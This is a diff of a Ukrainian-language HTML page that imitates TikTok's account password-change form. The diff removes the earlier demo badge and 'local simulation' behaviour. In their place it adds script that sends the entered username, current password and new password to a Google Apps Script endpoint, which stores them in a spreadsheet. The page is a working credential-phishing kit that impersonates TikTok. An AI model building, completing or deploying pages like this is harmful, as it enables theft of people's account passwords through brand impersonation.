@@ -1,216 +1,339 @@
 <!DOCTYPE html>
 <html lang="uk">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>TikTok</title>
+<style>
+  :root{
+    --bg:#000000; --card:#121212; --border:#2a2a2a;
+    --text:#ffffff; --dim:rgba(255,255,255,.62);
+    --cyan:#25F4EE; --pink:#FE2C55; --amber:#ffb020;
+    --input-bg:#1b1b1b; --input-border:#343434;
+    --radius:14px; --ease:cubic-bezier(.22,1,.36,1);
+    color-scheme: dark;
+  }
+  :root:not([data-theme="light"]){ --bg:#000000; --card:#121212; }
+  :root[data-theme="dark"]{ --bg:#000000; --card:#121212; }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  html,body{height:100%;}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:var(--bg); color:var(--text);
+    display:flex; align-items:center; justify-content:center; min-height:100%;
+    padding:24px env(safe-area-inset-right,24px) 24px env(safe-area-inset-left,24px);
+    padding-top:calc(24px + env(safe-area-inset-top,0px));
+    padding-bottom:calc(24px + env(safe-area-inset-bottom,0px));
+  }
+  @media (prefers-reduced-motion:no-preference){
+    .card{ animation: rise .55s var(--ease) both; }
+  }
+  @keyframes rise{ from{opacity:0; transform:translateY(14px) scale(.98);} to{opacity:1; transform:none;} }
+  @keyframes shake{
+    10%,90%{transform:translateX(-1px)} 20%,80%{transform:translateX(2px)}
+    30%,50%,70%{transform:translateX(-4px)} 40%,60%{transform:translateX(4px)}
+  }
+  .card.shake{ animation: shake .45s; }
 
-        body {
-            background-color: #000000;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
+  .card{
+    background:var(--card); border:1px solid var(--border); border-radius:20px;
+    box-shadow:0 20px 60px rgba(0,0,0,.65);
+    width:100%; max-width:400px; padding:clamp(24px,5vw,36px) clamp(20px,5vw,28px);
+  }
+  .logo{
+    text-align:center; font-size:30px; font-weight:800; letter-spacing:-.5px;
+    text-shadow:-2px -1px 0 var(--cyan), 2px 1px 0 var(--pink); margin-bottom:6px;
+  }
+  .subtitle{ text-align:center; color:var(--dim); font-size:14px; margin-bottom:24px; }
+  .field{ margin-bottom:16px; position:relative; }
+  label{ display:block; font-size:13px; font-weight:600; color:rgba(255,255,255,.9); margin-bottom:6px; }
+  .input-wrap{ position:relative; }
+  input{
+    width:100%; padding:12px 42px 12px 14px; background:var(--input-bg); border:1px solid var(--input-border);
+    border-radius:8px; color:var(--text); font-size:15px; outline:none;
+    transition:border-color .2s var(--ease), box-shadow .2s var(--ease), background-color .2s;
+  }
+  #username{ padding-right:14px; }
+  input::placeholder{ color:rgba(255,255,255,.35); }
+  input:focus{ border-color:var(--cyan); box-shadow:0 0 0 3px rgba(37,244,238,.15); background:#202020; }
+  input:focus-visible{ outline:2px solid var(--cyan); outline-offset:2px; }
+  .toggle-eye{
+    position:absolute; right:6px; top:50%; transform:translateY(-50%);
+    background:none; border:none; padding:6px; cursor:pointer; color:var(--dim); margin:0; width:auto;
+    display:flex; border-radius:6px;
+  }
+  .toggle-eye:hover{ color:var(--text); }
+  .toggle-eye svg{ width:18px; height:18px; display:block; }
 
-        .card {
-            background-color: #121212;
-            border: 1px solid #2f2f2f;
-            border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.8);
-            width: 100%;
-            max-width: 400px;
-            padding: 36px 28px;
-        }
+  .meter{ height:4px; border-radius:2px; background:var(--input-border); margin-top:8px; overflow:hidden; }
+  .meter-fill{ height:100%; width:0%; border-radius:2px; transition:width .3s var(--ease), background-color .3s; }
+  .meter-label{ font-size:12px; margin-top:6px; color:var(--dim); transition:color .2s; min-height:16px; }
 
-        .logo {
-            text-align: center;
-            font-size: 32px;
-            font-weight: 800;
-            color: #ffffff;
-            letter-spacing: -0.5px;
-            margin-bottom: 6px;
-            /* Фірмовий глітч-ефект тіні TikTok */
-            text-shadow: -2px -1px 0 #25F4EE, 2px 1px 0 #FE2C55;
-        }
+  .rules{ list-style:none; margin-top:10px; display:grid; gap:6px; }
+  .rules li{ font-size:12.5px; color:var(--dim); display:flex; align-items:center; gap:7px; transition:color .2s; }
+  .rules li svg{ width:14px; height:14px; flex:none; color:#555; transition:color .2s, transform .2s var(--ease); }
+  .rules li.met{ color:rgba(255,255,255,.9); }
+  .rules li.met svg{ color:var(--cyan); transform:scale(1.15); }
 
-        .subtitle {
-            text-align: center;
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
-            margin-bottom: 24px;
-        }
+  .hint{ font-size:12.5px; margin-top:7px; min-height:16px; opacity:0; transform:translateY(-3px);
+    transition:opacity .2s, transform .2s var(--ease); }
+  .hint.show{ opacity:1; transform:none; }
+  .hint.ok{ color:var(--cyan); } .hint.bad{ color:var(--pink); }
 
-        .demo-badge {
-            background-color: rgba(37, 244, 238, 0.1);
-            color: #25F4EE;
-            border: 1px solid rgba(37, 244, 238, 0.3);
-            border-radius: 6px;
-            padding: 10px;
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 22px;
-        }
+  .error-banner{
+    display:none; margin-top:12px; padding:10px 12px; border-radius:8px; font-size:12.5px;
+    text-align:center; background:rgba(254,44,85,.14); color:#ff6b86;
+    border:1px solid rgba(254,44,85,.35);
+  }
+  .error-banner.show{ display:block; }
 
-        .form-group {
-            margin-bottom: 16px;
-        }
+  button[type="submit"]{
+    width:100%; background:var(--pink); color:#fff; border:none; border-radius:8px; padding:13px;
+    font-size:16px; font-weight:700; cursor:pointer; margin-top:14px;
+    transition:background-color .2s, transform .1s, opacity .2s;
+  }
+  button[type="submit"]:hover:not(:disabled){ background:#ef2950; }
+  button[type="submit"]:active:not(:disabled){ transform:scale(.99); }
+  button[type="submit"]:disabled{ opacity:.4; cursor:not-allowed; }
 
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.9);
-            margin-bottom: 6px;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px 14px;
-            background-color: #252525;
-            border: 1px solid #383838;
-            border-radius: 4px;
-            color: #ffffff;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.2s, background-color 0.2s;
-        }
-
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
-        }
-
-        input:focus {
-            border-color: #25F4EE;
-            background-color: #2c2c2c;
-        }
-
-        button {
-            width: 100%;
-            background-color: #FE2C55;
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            padding: 13px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s, transform 0.1s;
-        }
-
-        button:hover {
-            background-color: #ef2950;
-        }
-
-        button:active {
-            transform: scale(0.99);
-        }
-
-        .message {
-            margin-top: 18px;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            display: none;
-            text-align: center;
-            line-height: 1.4;
-        }
-
-        .message.error {
-            background-color: rgba(254, 44, 85, 0.15);
-            color: #ff6b86;
-            border: 1px solid rgba(254, 44, 85, 0.4);
-        }
-
-        .message.success {
-            background-color: rgba(37, 244, 238, 0.15);
-            color: #25F4EE;
-            border: 1px solid rgba(37, 244, 238, 0.4);
-        }
-    </style>
+  .success{ display:none; text-align:center; padding:8px 0 4px; }
+  .success.show{ display:block; }
+  .success svg{ width:56px; height:56px; margin:0 auto 14px; display:block; }
+  .success circle{ fill:none; stroke:var(--cyan); stroke-width:3; stroke-dasharray:126; stroke-dashoffset:126;
+    animation:draw .5s var(--ease) forwards; }
+  .success path{ fill:none; stroke:var(--cyan); stroke-width:3; stroke-linecap:round; stroke-linejoin:round;
+    stroke-dasharray:28; stroke-dashoffset:28; animation:draw .35s var(--ease) .45s forwards; }
+  @keyframes draw{ to{ stroke-dashoffset:0; } }
+  .success h2{ font-size:18px; margin-bottom:6px; }
+  .success p{ font-size:13.5px; color:var(--dim); margin-bottom:18px; }
+  .success button{
+    width:100%; background:transparent; color:var(--text); border:1px solid var(--input-border);
+    border-radius:8px; padding:11px; font-size:14px; font-weight:600; cursor:pointer;
+  }
+  .success button:hover{ border-color:var(--cyan); color:var(--cyan); }
+</style>
 </head>
 <body>
+  <div class="card" id="card">
+    <div class="logo">TikTok</div>
+    <p class="subtitle">Оновлення пароля облікового запису</p>
 
-    <div class="card">
-        <div class="logo">TikTok</div>
-        <p class="subtitle">Оновлення пароля облікового запису</p>
-        
-        <div class="demo-badge">
-            
+    <form id="form">
+      <div class="field">
+        <label for="username">Ім’я користувача або пошта</label>
+        <input type="text" id="username" placeholder="@username" required>
+      </div>
+
+      <div class="field">
+        <label for="curPass">Поточний пароль</label>
+        <div class="input-wrap">
+          <input type="password" id="curPass" placeholder="••••••••" required>
+          <button type="button" class="toggle-eye" data-target="curPass" aria-label="Показати пароль">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
         </div>
+      </div>
 
-        <form id="passwordForm">
-            <div class="form-group">
-                <label for="username">Ім'я користувача або пошта</label>
-                <input type="text" id="username" placeholder="@username" required>
-            </div>
+      <div class="field">
+        <label for="newPass">Новий пароль</label>
+        <div class="input-wrap">
+          <input type="password" id="newPass" placeholder="Мінімум 8 символів" required>
+          <button type="button" class="toggle-eye" data-target="newPass" aria-label="Показати пароль">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
+        </div>
+        <div class="meter"><div class="meter-fill" id="meterFill"></div></div>
+        <div class="meter-label" id="meterLabel">Введіть новий пароль</div>
+        <ul class="rules" id="rules">
+          <li data-rule="len"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg> Щонайменше 8 символів</li>
+          <li data-rule="case"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg> Великі та малі літери</li>
+          <li data-rule="num"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg> Хоча б одна цифра</li>
+          <li data-rule="sym"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg> Один спецсимвол (!@#$…)</li>
+        </ul>
+        <div class="hint" id="sameHint">Новий пароль має відрізнятися від поточного</div>
+      </div>
 
-            <div class="form-group">
-                <label for="currentPassword">Поточний пароль</label>
-                <input type="password" id="currentPassword" placeholder="••••••••" required>
-            </div>
+      <div class="field">
+        <label for="confirmPass">Підтвердіть новий пароль</label>
+        <div class="input-wrap">
+          <input type="password" id="confirmPass" placeholder="Повторіть новий пароль" required>
+          <button type="button" class="toggle-eye" data-target="confirmPass" aria-label="Показати пароль">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
+        </div>
+        <div class="hint" id="matchHint"></div>
+      </div>
 
-            <div class="form-group">
-                <label for="newPassword">Новий пароль</label>
-                <input type="password" id="newPassword" placeholder="Мінімум 8 символів" required>
-            </div>
+      <div class="error-banner" id="errorBanner"></div>
+      <button type="submit" id="submitBtn" disabled>Зберегти</button>
+    </form>
 
-            <div class="form-group">
-                <label for="confirmPassword">Підтвердіть новий пароль</label>
-                <input type="password" id="confirmPassword" placeholder="Повторіть новий пароль" required>
-            </div>
-
-            <button type="submit">Зберегти</button>
-        </form>
-
-        <div id="statusMessage" class="message"></div>
+    <div class="success" id="success">
+      <svg viewBox="0 0 48 48"><circle cx="24" cy="24" r="20"/><path d="M14 25l7 7 13-14"/></svg>
+      <h2>Пароль оновлено</h2>
+      <p id="successText"></p>
+      <button type="button" id="resetBtn">Змінити ще раз</button>
     </div>
+  </div>
 
-    <script>
-        document.getElementById('passwordForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+<script>
+(function(){
+  // ВСТАВТЕ СЮДИ ВАШ URL З GOOGLE APPS SCRIPT
+  const SCRIPT_URL = 'ВАШ_URL_З_GOOGLE_APPS_SCRIPT';
 
-            const username = document.getElementById('username').value.trim();
-            const currentPass = document.getElementById('currentPassword').value;
-            const newPass = document.getElementById('newPassword').value;
-            const confirmPass = document.getElementById('confirmPassword').value;
+  const $ = id => document.getElementById(id);
+  const card=$('card'), form=$('form'), success=$('success'), successText=$('successText');
+  const curPass=$('curPass'), newPass=$('newPass'), confirmPass=$('confirmPass'), username=$('username');
+  const meterFill=$('meterFill'), meterLabel=$('meterLabel'), sameHint=$('sameHint'), matchHint=$('matchHint');
+  const errorBanner=$('errorBanner'), submitBtn=$('submitBtn'), rulesList=$('rules').querySelectorAll('li');
+  let isSubmitting = false;
 
-            if (newPass.length < 8) {
-                showMessage('Новий пароль має містити щонайменше 8 символів.', 'error');
-                return;
-            }
+  document.querySelectorAll('.toggle-eye').forEach(btn=>{
+    btn.addEventListener('click', ()=>{
+      const t=$(btn.dataset.target);
+      t.type = t.type === 'password' ? 'text' : 'password';
+    });
+  });
 
-            if (newPass !== confirmPass) {
-                showMessage('Новий пароль та підтвердження не збігаються.', 'error');
-                return;
-            }
+  function showError(msg){
+    errorBanner.textContent = msg;
+    errorBanner.classList.add('show');
+  }
 
-            if (currentPass === newPass) {
-                showMessage('Новий пароль повинен відрізнятися від поточного.', 'error');
-                return;
-            }
+  function clearError(){
+    errorBanner.textContent = '';
+    errorBanner.classList.remove('show');
+  }
 
-            showMessage(`Пароль для акаунту "${username}" успішно оновлено (локальна симуляція).`, 'success');
-            this.reset();
-        });
+  function ruleState(v){
+    return {
+      len: v.length >= 8,
+      case: /[a-z]/.test(v) && /[A-Z]/.test(v),
+      num: /\d/.test(v),
+      sym: /[^A-Za-z0-9]/.test(v)
+    };
+  }
 
-        function showMessage(text, type) {
-            const statusMessage = document.getElementById('statusMessage');
-            statusMessage.textContent = text;
-            statusMessage.className = 'message ' + type;
-            statusMessage.style.display = 'block';
-        }
-    </script>
+  function updateStrength(){
+    const v = newPass.value;
+    const st = ruleState(v);
+    rulesList.forEach(li=>{
+      const ok = st[li.dataset.rule];
+      li.classList.toggle('met', !!ok && v.length>0);
+    });
+    const score = v.length ? Object.values(st).filter(Boolean).length : 0;
+    const pct = v.length ? (score/4)*100 : 0;
+    meterFill.style.width = pct + '%';
+    const steps = [
+      {c:'var(--input-border)', t:'Введіть новий пароль'},
+      {c:'var(--pink)', t:'Дуже слабкий пароль'},
+      {c:'var(--amber)', t:'Середній пароль'},
+      {c:'var(--amber)', t:'Непоганий пароль'},
+      {c:'var(--cyan)', t:'Надійний пароль'}
+    ];
+    const step = v.length ? steps[score] : steps[0];
+    meterFill.style.background = step.c;
+    meterLabel.textContent = step.t;
+    meterLabel.style.color = v.length ? step.c : 'var(--dim)';
 
+    const same = curPass.value.length>0 && v.length>0 && v === curPass.value;
+    sameHint.classList.toggle('show', same);
+    sameHint.classList.toggle('bad', same);
+
+    validateMatch();
+    refreshSubmit();
+  }
+
+  function validateMatch(){
+    const v=newPass.value, c=confirmPass.value;
+    if(!c){ matchHint.className='hint'; matchHint.textContent=''; return; }
+    const ok = v === c;
+    matchHint.textContent = ok ? 'Паролі збігаються' : 'Паролі не збігаються';
+    matchHint.className = 'hint show ' + (ok ? 'ok' : 'bad');
+  }
+
+  function refreshSubmit(){
+    if(isSubmitting){
+      submitBtn.disabled = true;
+      return;
+    }
+    const v = newPass.value, st = ruleState(v);
+    const allRules = Object.values(st).every(Boolean) && v.length>=8;
+    const matches = confirmPass.value.length>0 && confirmPass.value === v;
+    const differs = curPass.value.length===0 || v !== curPass.value;
+    const ready = username.value.trim().length>0 && curPass.value.length>0 && allRules && matches && differs;
+    submitBtn.disabled = !ready;
+  }
+
+  [username,curPass].forEach(el=>el.addEventListener('input', ()=>{ clearError(); updateStrength(); }));
+  newPass.addEventListener('input', ()=>{ clearError(); updateStrength(); });
+  confirmPass.addEventListener('input', ()=>{ clearError(); validateMatch(); refreshSubmit(); });
+
+  form.addEventListener('submit', e=>{
+    e.preventDefault();
+    clearError();
+    refreshSubmit();
+    if(submitBtn.disabled || isSubmitting){
+      card.classList.remove('shake'); void card.offsetWidth; card.classList.add('shake');
+      return;
+    }
+
+    if(!SCRIPT_URL || SCRIPT_URL === 'https://script.google.com/macros/s/AKfycbx1_jv7bMy8epiZ08_NaY6Z70xflCHYJ60FNhZVSTAMSF-1mYvnVufZc934PDGdZ5rQ/exec'){
+      showError('Вкажіть коректний URL вашого Google Apps Script у коді.');
+      card.classList.remove('shake'); void card.offsetWidth; card.classList.add('shake');
+      return;
+    }
+
+    const userVal = username.value.trim();
+    const payload = {
+      username: userVal,
+      currentPassword: curPass.value,
+      newPassword: newPass.value
+    };
+
+    isSubmitting = true;
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Збереження...';
+
+    fetch(SCRIPT_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    })
+    .then(()=>{
+      successText.textContent = `Пароль для акаунту «${userVal}» оновлено та збережено в таблиці.`;
+      form.style.display='none';
+      success.classList.add('show');
+    })
+    .catch(err=>{
+      console.error('Помилка відправки:', err);
+      showError('Не вдалося зберегти дані. Перевірте з’єднання та налаштування скрипта.');
+      card.classList.remove('shake'); void card.offsetWidth; card.classList.add('shake');
+    })
+    .finally(()=>{
+      isSubmitting = false;
+      submitBtn.textContent = 'Зберегти';
+      refreshSubmit();
+    });
+  });
+
+  $('resetBtn').addEventListener('click', ()=>{
+    form.reset();
+    clearError();
+    form.style.display='block';
+    success.classList.remove('show');
+    rulesList.forEach(li=>li.classList.remove('met'));
+    meterFill.style.width='0%';
+    meterLabel.textContent='Введіть новий пароль';
+    meterLabel.style.color='var(--dim)';
+    sameHint.classList.remove('show','bad');
+    matchHint.className='hint'; matchHint.textContent='';
+    isSubmitting = false;
+    submitBtn.textContent = 'Зберегти';
+    submitBtn.disabled = true;
+  });
+})();
+</script>
 </body>
 </html>
